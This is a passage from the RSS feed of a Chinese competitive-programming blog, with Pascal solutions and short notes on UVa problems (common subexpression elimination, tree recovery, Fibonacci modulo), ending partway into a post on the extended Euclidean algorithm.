class="hljs-keyword">while</span> _ &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        dec(_);</span><br><span class="line">        <span class="hljs-keyword">read</span>(n, k);</span><br><span class="line">        fillchar(vis, sizeof(vis), <span class="hljs-number">0</span>);</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> k <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">read</span>(a[i, <span class="hljs-number">1</span>], a[i, <span class="hljs-number">2</span>]);</span><br><span class="line">        fillchar(ans, sizeof(ans), <span class="hljs-number">0</span>);</span><br><span class="line">        tot := <span class="hljs-number">0</span>;</span><br><span class="line">        dfs(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, n * (n+<span class="hljs-number">1</span>) <span class="hljs-keyword">div</span> <span class="hljs-number">2</span>);</span><br><span class="line">        writeln(<span class="hljs-string">&#x27;Found &#x27;</span>, tot, <span class="hljs-string">&#x27; golygon(s).&#x27;</span>);</span><br><span class="line">        writeln;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Pruning/">Pruning</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Search/">Search</category>
      
      
      <comments>https://i.hsfzxjy.site/uva225-golygons/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa12219 Common Subexpression Elimination</title>
      <link>https://i.hsfzxjy.site/uva12219-common-subexpression-elimination/</link>
      <guid>https://i.hsfzxjy.site/uva12219-common-subexpression-elimination/</guid>
      <pubDate>Sun, 05 Oct 2014 08:20:18 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;page=show_problem&amp;proble</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&page=show_problem&problem=3371">Link</a> 状态：<strong>Runtime Error</strong></p></blockquote><h2 id="前言">前言</h2><p >这题做的可真够久的，整整三个小时。但即便如此，还是只过了一部分的点，另一部分报运行时错误——估计是哈希表设计的不太好。但这确实是一道好题，因此，在睡觉前决定记录一下。</p><h2 id="分析">分析</h2><p >很容易便想到：用一个三元组 $(x,y,z)$ 表示节点，表示内容为 x 的节点下跟着标号为 y 和 z 的左右子树。这样一来，一类相同的子树便可以唯一确定了，而不必每构造一棵子树就把整棵树遍历一遍。对于三元组的储存，刚开始图方便，用了数组。查找也是用了 $O(n)$ 的线性查找。磕磕碰碰写了两个多小时然后兴冲冲地提交，结果 TLE 了…………没办法，只好又花了半个小时写了一个哈希表，然后就是上文说过的情况了：<strong>Runtime Error204</strong>。可能是哈希数组过大的原因，日后再微调一下，今天实在是没有脑子了。</p><h2 id="code">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">const</span></span><br><span class="line">  maxn = <span class="hljs-number">20000</span>;</span><br><span class="line"><span class="hljs-keyword">type</span></span><br><span class="line">  NodeRec = <span class="hljs-keyword">record</span></span><br><span class="line">    Value: <span class="hljs-keyword">string</span>;</span><br><span class="line">    l, r, <span class="hljs-keyword">index</span>: longint;</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line">  Node = <span class="hljs-keyword">record</span></span><br><span class="line">      left, right: longint;   <span class="hljs-comment">//Index of left and right child in the `tree` array, -1 for none.</span></span><br><span class="line">      Rec: NodeRec;</span><br><span class="line">      <span class="hljs-keyword">index</span>: longint;</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line">  <span class="hljs-comment">//以下为哈希表的定义</span></span><br><span class="line">  _PNode = ^_Node;</span><br><span class="line">  _Node = <span class="hljs-keyword">record</span></span><br><span class="line">    n: Node;</span><br><span class="line">    next: _PNode;</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">  HashTable = <span class="hljs-keyword">object</span></span><br><span class="line">    arr: <span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..maxn] <span class="hljs-keyword">of</span> _PNode;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hash</span><span class="hljs-params">(n: NodeRec)</span>:</span> longint;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">add</span><span class="hljs-params">(n: Node)</span>;</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">clear</span>;</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find</span><span class="hljs-params">(n: NodeRec)</span>:</span> longint;</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">HashTable</span>.<span class="hljs-title">clear</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  i: longint;</span><br><span class="line">  p, q: _PNode;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> maxn <span class="hljs-keyword">do</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">    p := arr[i];</span><br><span class="line">    <span class="hljs-keyword">while</span> p&lt;&gt;<span class="hljs-keyword">nil</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">      q := p^.next;</span><br><span class="line">      dispose(p);</span><br><span class="line">      p := q;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line">  fillchar(arr, sizeof(arr),<span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cmp</span><span class="hljs-params">(r1, r2: NodeRec)</span>:</span> Boolean;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  cmp := (r1.l = r2.l) <span class="hljs-keyword">and</span> (r1.r = r2.r) <span class="hljs-keyword">and</span> (r1.Value = r2.Value);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">HashTable</span>.<span class="hljs-title">hash</span><span class="hljs-params">(n: NodeRec)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  i: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  hash := <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> length(n.Value) <span class="hljs-keyword">do</span></span><br><span class="line">    hash := (hash*<span class="hljs-number">5</span> + ord(n.Value[i]) - ord(<span class="hljs-string">&#x27;a&#x27;</span>)) <span class="hljs-keyword">mod</span> maxn;</span><br><span class="line">  hash := (hash + n.l * <span class="hljs-number">10</span> + n.r * <span class="hljs-number">5</span>) <span class="hljs-keyword">mod</span> maxn;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">HashTable</span>.<span class="hljs-title">add</span><span class="hljs-params">(n: Node)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  h: longint;</span><br><span class="line">  p, q: _PNode;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  h := hash(n.rec);</span><br><span class="line">  new(q);</span><br><span class="line">  fillchar(q^, sizeof(_Node), <span class="hljs-number">0</span>);</span><br><span class="line">  q^.next := arr[h];</span><br><span class="line">  q^.n := n;</span><br><span class="line">  arr[h] := q;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">HashTable</span>.<span class="hljs-title">find</span><span class="hljs-params">(n: NodeRec)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  p: _PNode;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  find := -<span class="hljs-number">1</span>;</span><br><span class="line">  p := arr[hash(n)];</span><br><span class="line">  <span class="hljs-keyword">while</span> (p&lt;&gt;<span class="hljs-keyword">nil</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> cmp(n, p^.n.rec) <span class="hljs-keyword">do</span> p := p^.next;</span><br><span class="line">  <span class="hljs-keyword">if</span> p &lt;&gt; <span class="hljs-keyword">nil</span> <span class="hljs-keyword">then</span></span><br><span class="line">    find := p^.n.<span class="hljs-keyword">index</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-comment">//哈系表定义结束</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  inputs: Ansistring;</span><br><span class="line">  _: longint;</span><br><span class="line">  tree: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">50001</span>] <span class="hljs-keyword">of</span> Node;</span><br><span class="line">  cur: longint;              <span class="hljs-comment">//The current pointer of the input string.</span></span><br><span class="line">  num: longint;              <span class="hljs-comment">//The current number of the `tree` array.</span></span><br><span class="line">  ls: longint;</span><br><span class="line">  t: longint;</span><br><span class="line">  tot: longint;</span><br><span class="line">  ht: HashTable;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span>:</span> longint; <span class="hljs-comment">//建树</span></span><br><span class="line"><span class="hljs-keyword">label</span> lb;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  rec: NodeRec;</span><br><span class="line">  i,j,l,r: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  l := <span class="hljs-number">0</span>;</span><br><span class="line">  r := <span class="hljs-number">0</span>;</span><br><span class="line">  fillchar(rec, sizeof(rec), <span class="hljs-number">0</span>);</span><br><span class="line">  inc(tot);</span><br><span class="line">  rec.<span class="hljs-keyword">index</span> := tot;</span><br><span class="line">  <span class="hljs-keyword">while</span> (cur&lt;=ls) <span class="hljs-keyword">and</span> (inputs[cur] <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>]) <span class="hljs-keyword">do</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">    rec.Value := rec.Value+inputs[cur];</span><br><span class="line">    inc(cur);</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> cur&gt;ls <span class="hljs-keyword">then</span> <span class="hljs-keyword">goto</span> lb;    <span class="hljs-comment">//。。。这里被迫跳转控制流，由于实在不想多谢，就用了臭名昭著的label</span></span><br><span class="line">  <span class="hljs-keyword">if</span> inputs[cur] = <span class="hljs-string">&#x27;(&#x27;</span> <span class="hljs-keyword">then</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">    inc(cur);</span><br><span class="line">    l := build();</span><br><span class="line">    rec.l := tree[l].rec.<span class="hljs-keyword">index</span>;</span><br><span class="line">    inc(cur);</span><br><span class="line">    r := build();</span><br><span class="line">    rec.r := tree[r].rec.<span class="hljs-keyword">index</span>;</span><br><span class="line">    inc(cur);</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line">  j := ht.find(rec);</span><br><span class="line">  <span class="hljs-keyword">if</span> j&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">    dec(tot);</span><br><span class="line">    <span class="hljs-keyword">exit</span>(j);</span><br><span class="line">  <span class="hljs-keyword">end</span></span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">lb:</span><br><span class="line">    inc(num);</span><br><span class="line">    tree[num].left := l;</span><br><span class="line">    tree[num].right := r;</span><br><span class="line">    tree[num].rec := rec;</span><br><span class="line">    tree[num].<span class="hljs-keyword">index</span> := num;</span><br><span class="line">    ht.add(tree[num]);</span><br><span class="line">    <span class="hljs-keyword">exit</span>(num);</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">print</span><span class="hljs-params">(n: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  <span class="hljs-keyword">if</span> tree[n].rec.<span class="hljs-keyword">index</span> &gt; t <span class="hljs-keyword">then</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">write</span>(tree[n].rec.Value);</span><br><span class="line">    t := tree[n].rec.<span class="hljs-keyword">index</span>;</span><br><span class="line">  <span class="hljs-keyword">end</span></span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">write</span>(tree[n].rec.<span class="hljs-keyword">index</span>);</span><br><span class="line">    <span class="hljs-keyword">exit</span>;</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> tree[n].right = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">exit</span>;</span><br><span class="line">  <span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;(&#x27;</span>);</span><br><span class="line">  print(tree[n].left);</span><br><span class="line">  <span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;,&#x27;</span>);</span><br><span class="line">  print(tree[n].right);</span><br><span class="line">  <span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;)&#x27;</span>);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">  assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line">  readln(_);</span><br><span class="line">  fillchar(ht.arr, sizeof(ht.arr),<span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-keyword">while</span> _&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">  <span class="hljs-keyword">begin</span></span><br><span class="line">    dec(_);</span><br><span class="line">    readln(inputs);</span><br><span class="line">    fillchar(tree, sizeof(tree), <span class="hljs-number">0</span>);</span><br><span class="line">    ht.clear;</span><br><span class="line">    ls := length(inputs);</span><br><span class="line">    cur := <span class="hljs-number">1</span>;  num := <span class="hljs-number">0</span>; tot := <span class="hljs-number">0</span>;</span><br><span class="line">    build;</span><br><span class="line">    t := <span class="hljs-number">0</span>;</span><br><span class="line">    print(num);</span><br><span class="line">    writeln;</span><br><span class="line">  <span class="hljs-keyword">end</span>;</span><br><span class="line">  close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva12219-common-subexpression-elimination/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa536 Recovery</title>
      <link>https://i.hsfzxjy.site/uva536-recovery/</link>
      <guid>https://i.hsfzxjy.site/uva536-recovery/</guid>
      <pubDate>Sun, 05 Oct 2014 08:03:04 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=7&amp;page=show_pro</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&category=7&page=show_problem&problem=477">Link</a> 耗时：0.012s</p></blockquote><h2 id="前言-1">前言</h2><p >真是疯玩了几天，脑袋都残了，一道弱智题做了近一个小时。</p><h2 id="code-1">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    pre, mid, s: <span class="hljs-keyword">string</span>;</span><br><span class="line">    tree: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">50</span>] <span class="hljs-keyword">of</span> <span class="hljs-keyword">record</span></span><br><span class="line">        l, r: integer;</span><br><span class="line">        ch: char;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    cur: integer;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>:</span> integer;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    m: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    readln(s);</span><br><span class="line">    m := length(s) &gt;&gt; <span class="hljs-number">1</span> + <span class="hljs-number">1</span>;</span><br><span class="line">    pre := Copy(s, <span class="hljs-number">1</span>, m-<span class="hljs-number">1</span>);</span><br><span class="line">    mid := Copy(s, m+<span class="hljs-number">1</span>, length(s));</span><br><span class="line">    init := m-<span class="hljs-number">1</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build</span><span class="hljs-params">(l1, l2, r2: integer)</span>:</span> integer;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    m,len: integer;</span><br><span class="line">    t: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> l2 &gt; r2 <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//该子树不存在。**这个地方坑了我很久**</span></span><br><span class="line">    inc(cur);</span><br><span class="line">    t := cur;      <span class="hljs-comment">// 这里也坑了我，当下面构造完左右子树后，cur已经变了，所以要缓存起来</span></span><br><span class="line">    build := t;</span><br><span class="line">    tree[t].ch := pre[l1];</span><br><span class="line">    <span class="hljs-keyword">if</span> r2-l2 = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span> <span class="hljs-comment">//叶节点</span></span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    m := pos(pre[l1], mid); <span class="hljs-comment">//在中序遍历中找根节点</span></span><br><span class="line">    len := m - l2;</span><br><span class="line">    tree[t].l := build(l1+<span class="hljs-number">1</span>, l2, m-<span class="hljs-number">1</span>); <span class="hljs-comment">//构造左子树</span></span><br><span class="line">    tree[t].r := build(l1+len+<span class="hljs-number">1</span>, m+<span class="hljs-number">1</span>, r2); <span class="hljs-comment">//构造右子树</span></span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">print</span><span class="hljs-params">(x: integer)</span>;</span></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>;</span><br><span class="line">    print(tree[x].l);</span><br><span class="line">    print(tree[x].r);</span><br><span class="line">    <span class="hljs-keyword">write</span>(tree[x].ch);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> eof <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        fillchar(tree, sizeof(tree), <span class="hljs-number">0</span>);</span><br><span class="line">        cur := <span class="hljs-number">0</span>;</span><br><span class="line">        build(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, init);</span><br><span class="line">        print(<span class="hljs-number">1</span>);</span><br><span class="line">        writeln;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    close(input);</span><br><span class="line">    close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva536-recovery/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa11582 Colossal Fibonacci Numbers! &amp;&amp; 大数操作</title>
      <link>https://i.hsfzxjy.site/uva11582-colossal-fibonacci-numbers/</link>
      <guid>https://i.hsfzxjy.site/uva11582-colossal-fibonacci-numbers/</guid>
      <pubDate>Wed, 01 Oct 2014 03:12:27 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;page=show_problem&amp;catego</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&page=show_problem&category=27&problem=2629&mosmsg=Submission%20received%20with%20ID%2014290914">Link</a> 耗时：0.139s</p></blockquote><h2 id="前言-2">前言</h2><p >这道题的主要思路就是打表，看看 Fibonacci 数列模 n 几个一循环。但由于这题给的数太大了，从而在细节上耗了很久。在此记录一下：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    x: qword;</span><br><span class="line">    y: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    x := <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">64</span>-<span class="hljs-number">1</span>;</span><br><span class="line">    y := <span class="hljs-number">100</span>;</span><br><span class="line">    x := x <span class="hljs-keyword">mod</span> y; <span class="hljs-comment">//报错201</span></span><br><span class="line">    x := x <span class="hljs-keyword">mod</span> qword(y); <span class="hljs-comment">//正确</span></span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div><h2 id="code-2">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    a,b: qword;</span><br><span class="line">    _, n, i, k, cnt: longint;</span><br><span class="line">    f: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">1000000</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">superMod</span><span class="hljs-params">(a, b: qword; m: longint)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    x: qword;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> b = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    x := superMod(a, b <span class="hljs-keyword">shr</span> <span class="hljs-number">1</span>, m);</span><br><span class="line">    superMod := x * x <span class="hljs-keyword">mod</span> m;</span><br><span class="line">    <span class="hljs-keyword">if</span> odd(b) <span class="hljs-keyword">then</span></span><br><span class="line">        superMod := superMod * a <span class="hljs-keyword">mod</span> m;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line">    readln(_);</span><br><span class="line">    <span class="hljs-keyword">while</span> _ &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        dec(_);</span><br><span class="line">        readln(a, b, n);</span><br><span class="line">        <span class="hljs-keyword">if</span> a = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            writeln(<span class="hljs-number">0</span>);</span><br><span class="line">            <span class="hljs-keyword">continue</span>;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> n = <span class="hljs-number">1</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            writeln(<span class="hljs-number">0</span>);</span><br><span class="line">            <span class="hljs-keyword">continue</span>;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        f[<span class="hljs-number">1</span>] := <span class="hljs-number">1</span>;</span><br><span class="line">        f[<span class="hljs-number">2</span>] := <span class="hljs-number">1</span>;</span><br><span class="line">        cnt := <span class="hljs-number">2</span>;</span><br><span class="line">        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> ((f[cnt-<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>) <span class="hljs-keyword">and</span> (f[cnt] = <span class="hljs-number">0</span>)) <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            inc(cnt);</span><br><span class="line">            f[cnt] := (f[cnt-<span class="hljs-number">1</span>] + f[cnt-<span class="hljs-number">2</span>]) <span class="hljs-keyword">mod</span> n;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        <span class="hljs-comment">//while x &gt; int64(1 &lt;&lt;60) do</span></span><br><span class="line">        <span class="hljs-comment">//    x := x - int64((cnt &lt;&lt; 59));</span></span><br><span class="line">        a := a <span class="hljs-keyword">mod</span> qword(cnt);</span><br><span class="line">        k := superMod(a, b, cnt);</span><br><span class="line">        writeln(f[k]);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    close(output); close(input);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva11582-colossal-fibonacci-numbers/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>扩展欧几里得算法</title>
      <link>https://i.hsfzxjy.site/extended-gcd-algorithm/</link>
      <guid>https://i.hsfzxjy.site/extended-gcd-algorithm/</guid>
      <pubDate>Wed, 01 Oct 2014 00:55:50 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 今天开始学习数论方面的算法。这部分在 NOIP 中并不常出现，即使出现了也不会像高联这么难（。。。）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;什么是扩展欧几里得算法&quot;&gt;什么是扩展欧几里得算法&lt;/h</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 今天开始学习数论方面的算法。这部分在 NOIP 中并不常出现，即使出现了也不会像高联这么难（。。。）。</p></blockquote><h2 id="什么是扩展欧几里得算法">什么是扩展欧几里得算法</h2><p >所谓欧几里得算法，实际上就是辗转相除法——求两个数最大公约数的一种高效算法。而扩展欧几里得算法则是来源于于一类方程的解决：</p><p >$$ax+by=gcd(a,b)$$</p><p  class="nomargin"> 这有点像是<strong>裴蜀定理</strong>的一般形式。和裴蜀定理类似，这类方程也有无数多个整数解。如何高效率地求得它的一组特解呢？</p><h2 id="代码">代码</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">gcd_ex</span><span class="hljs-params">(a, b: longint; <span class="hljs-keyword">var</span> d: longint; <span class="hljs-keyword">var</span> x, y: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> b = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        d := a;</span><br><span class="line">        x := <span class="hljs-number">1</span>;</span><br><span class="line">        y := <span class="hljs-number">0</span>;</span><br><span class="line">        <span 